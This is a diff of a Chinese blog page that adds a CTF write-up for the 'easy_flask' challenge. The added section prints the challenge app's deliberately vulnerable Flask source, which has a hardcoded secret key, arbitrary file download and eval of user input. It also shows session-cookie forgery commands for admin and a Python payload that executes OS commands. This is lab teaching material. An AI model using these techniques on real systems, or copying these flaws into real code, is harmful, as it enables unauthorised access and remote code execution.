@@ -268,7 +268,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">856字</span>
+        <span class="post-count">1.5k字</span>
       </span>
     </span>
 
@@ -277,7 +277,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">3分</span>
+        <span class="post-count">7分</span>
       </span>
     </span>
     
@@ -488,6 +488,186 @@ app <span class="token operator">=</span> Flask<span class="token punctuation">(
 <h2 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h2><blockquote>
 <p>session伪造+任意文件下载+python命令执行</p>
 </blockquote>
+<p>进入题目，是一个登录框</p>
+<p>随便注册一个账号登录，来到 &#x2F;profile 路由</p>
+<p><img src="/blog/2023/04/30/ctfshow2023%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20240921225127068.png" alt="image-20240921225127068"></p>
+<p>我们需要变成 admin</p>
+<p>点击 learn，进入 &#x2F;show 路由</p>
+<p>发现是源码：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># app.py</span>
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> session<span class="token punctuation">,</span> send_file<span class="token punctuation">,</span> Response
+
+
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+
+app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">'S3cr3tK3y'</span>
+
+users <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+
+<span class="token punctuation">&#125;</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+<span class="token comment"># Check if user is loggedin</span>
+<span class="token keyword">if</span> <span class="token string">'loggedin'</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>
+<span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'profile'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+msg <span class="token operator">=</span> <span class="token string">''</span>
+<span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span> <span class="token keyword">and</span> <span class="token string">'username'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>form <span class="token keyword">and</span> <span class="token string">'password'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>form<span class="token punctuation">:</span>
+username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>
+password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span>
+<span class="token keyword">if</span> username <span class="token keyword">in</span> users <span class="token keyword">and</span> password <span class="token operator">==</span> users<span class="token punctuation">[</span>username<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+session<span class="token punctuation">[</span><span class="token string">'loggedin'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">True</span>
+session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> username
+session<span class="token punctuation">[</span><span class="token string">'role'</span><span class="token punctuation">]</span> <span class="token operator">=</span> users<span class="token punctuation">[</span>username<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'role'</span><span class="token punctuation">]</span>
+<span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'profile'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">else</span><span class="token punctuation">:</span>
+msg <span class="token operator">=</span> <span class="token string">'Incorrect username/password!'</span>
+<span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">,</span> msg<span class="token operator">=</span>msg<span class="token punctuation">)</span>
+
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/register/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+msg <span class="token operator">=</span> <span class="token string">''</span>
+<span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span> <span class="token keyword">and</span> <span class="token string">'username'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>form <span class="token keyword">and</span> <span class="token string">'password'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>form<span class="token punctuation">:</span>
+username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>
+password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span>
+<span class="token keyword">if</span> username <span class="token keyword">in</span> users<span class="token punctuation">:</span>
+msg <span class="token operator">=</span> <span class="token string">'Account already exists!'</span>
+<span class="token keyword">else</span><span class="token punctuation">:</span>
+users<span class="token punctuation">[</span>username<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'password'</span><span class="token punctuation">:</span> password<span class="token punctuation">,</span> <span class="token string">'role'</span><span class="token punctuation">:</span> <span class="token string">'user'</span><span class="token punctuation">&#125;</span>
+msg <span class="token operator">=</span> <span class="token string">'You have successfully registered!'</span>
+<span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">,</span> msg<span class="token operator">=</span>msg<span class="token punctuation">)</span>
+
+
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/profile/'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">profile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+<span class="token keyword">if</span> <span class="token string">'loggedin'</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>
+<span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'profile2.html'</span><span class="token punctuation">,</span> username<span class="token operator">=</span>session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> role<span class="token operator">=</span>session<span class="token punctuation">[</span><span class="token string">'role'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>拿到secret_key：<code>S3cr3tK3y</code>，接下来直接session伪造</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python flask_session_cookie_manager3.py decode <span class="token parameter variable">-s</span> <span class="token string">"S3cr3tK3y"</span> <span class="token parameter variable">-c</span> <span class="token string">"eyJsb2dnZWRpbiI6dHJ1ZSwicm9sZSI6InVzZXIiLCJ1c2VybmFtZSI6ImFhYSJ9.Zu7dSw.jsAFgyiDFumwWh1D4g5y9beUjhc"</span>
+<span class="token punctuation">&#123;</span><span class="token string">'loggedin'</span><span class="token builtin class-name">:</span> True, <span class="token string">'role'</span><span class="token builtin class-name">:</span> <span class="token string">'user'</span>, <span class="token string">'username'</span><span class="token builtin class-name">:</span> <span class="token string">'aaa'</span><span class="token punctuation">&#125;</span>
+
+
+python flask_session_cookie_manager3.py encode <span class="token parameter variable">-s</span> <span class="token string">"S3cr3tK3y"</span> <span class="token parameter variable">-t</span> <span class="token string">"&#123;'loggedin': True, 'role': 'admin', 'username': 'aaa'&#125;"</span>
+eyJsb2dnZWRpbiI6dHJ1ZSwicm9sZSI6ImFkbWluIiwidXNlcm5hbWUiOiJhYWEifQ.Zu7e1w.3JAhGuoIVs_G9q0sLFTSO1g7tvk<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2023/04/30/ctfshow2023%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20240921225928006.png" alt="image-20240921225928006"></p>
+<p>伪造成admin，多出一个文件下载的点</p>
+<p><img src="/blog/2023/04/30/ctfshow2023%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20240921230105517.png" alt="image-20240921230105517"></p>
+<p>存在任意文件读取，读取app.py拿到完整源码</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># app.py</span>
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> session<span class="token punctuation">,</span> send_file<span class="token punctuation">,</span> Response
+
+
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+
+app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">'S3cr3tK3y'</span>
+
+users <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+    <span class="token string">'admin'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'LKHSADSFHLA;KHLK;FSDHLK;ASFD'</span><span class="token punctuation">,</span> <span class="token string">'role'</span><span class="token punctuation">:</span> <span class="token string">'admin'</span><span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment"># Check if user is loggedin</span>
+    <span class="token keyword">if</span> <span class="token string">'loggedin'</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'profile'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    msg <span class="token operator">=</span> <span class="token string">''</span>
+    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span> <span class="token keyword">and</span> <span class="token string">'username'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>form <span class="token keyword">and</span> <span class="token string">'password'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>form<span class="token punctuation">:</span>
+        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>
+        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span>
+        <span class="token keyword">if</span> username <span class="token keyword">in</span> users <span class="token keyword">and</span> password <span class="token operator">==</span> users<span class="token punctuation">[</span>username<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+            session<span class="token punctuation">[</span><span class="token string">'loggedin'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">True</span>
+            session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> username
+            session<span class="token punctuation">[</span><span class="token string">'role'</span><span class="token punctuation">]</span> <span class="token operator">=</span> users<span class="token punctuation">[</span>username<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'role'</span><span class="token punctuation">]</span>
+            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'profile'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            msg <span class="token operator">=</span> <span class="token string">'Incorrect username/password!'</span>
+    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login2.html'</span><span class="token punctuation">,</span> msg<span class="token operator">=</span>msg<span class="token punctuation">)</span>
+
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/register/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    msg <span class="token operator">=</span> <span class="token string">''</span> 
+    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span> <span class="token keyword">and</span> <span class="token string">'username'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>form <span class="token keyword">and</span> <span class="token string">'password'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>form<span class="token punctuation">:</span>
+        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>
+        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span>
+        <span class="token keyword">if</span> username <span class="token keyword">in</span> users<span class="token punctuation">:</span>
+            msg <span class="token operator">=</span> <span class="token string">'Account already exists!'</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            users<span class="token punctuation">[</span>username<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'password'</span><span class="token punctuation">:</span> password<span class="token punctuation">,</span> <span class="token string">'role'</span><span class="token punctuation">:</span> <span class="token string">'user'</span><span class="token punctuation">&#125;</span>
+            msg <span class="token operator">=</span> <span class="token string">'You have successfully registered!'</span>
+    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register2.html'</span><span class="token punctuation">,</span> msg<span class="token operator">=</span>msg<span class="token punctuation">)</span>
+
+
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/profile/'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">profile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> <span class="token string">'loggedin'</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'profile2.html'</span><span class="token punctuation">,</span> username<span class="token operator">=</span>session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> role<span class="token operator">=</span>session<span class="token punctuation">[</span><span class="token string">'role'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/show/'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> <span class="token string">'loggedin'</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'show2.html'</span><span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/download/'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">download</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> <span class="token string">'loggedin'</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>
+        filename <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'filename'</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token string">'filename'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>args<span class="token punctuation">:</span>              
+            <span class="token keyword">return</span> send_file<span class="token punctuation">(</span>filename<span class="token punctuation">,</span> as_attachment<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+  
+    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/hello/'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        s <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'eval'</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"hello,</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>
+    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
+        <span class="token keyword">pass</span>
+        
+    <span class="token keyword">return</span> <span class="token string">"hello"</span>
+    
+
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/logout/'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+   session<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'loggedin'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>
+   session<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>
+   session<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>
+   session<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'role'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>
+   <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>发现 &#x2F;hello 路由有命令执行</p>
+<p>直接命令执行：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"ls /"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2023/04/30/ctfshow2023%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20240921230347855.png" alt="image-20240921230347855"></p>
 <hr>
 <h2 id="暗网聊天室（待复现）"><a href="#暗网聊天室（待复现）" class="headerlink" title="暗网聊天室（待复现）"></a>暗网聊天室（待复现）</h2><hr>
 <h2 id="easy-php（待复现）"><a href="#easy-php（待复现）" class="headerlink" title="easy_php（待复现）"></a>easy_php（待复现）</h2><hr>
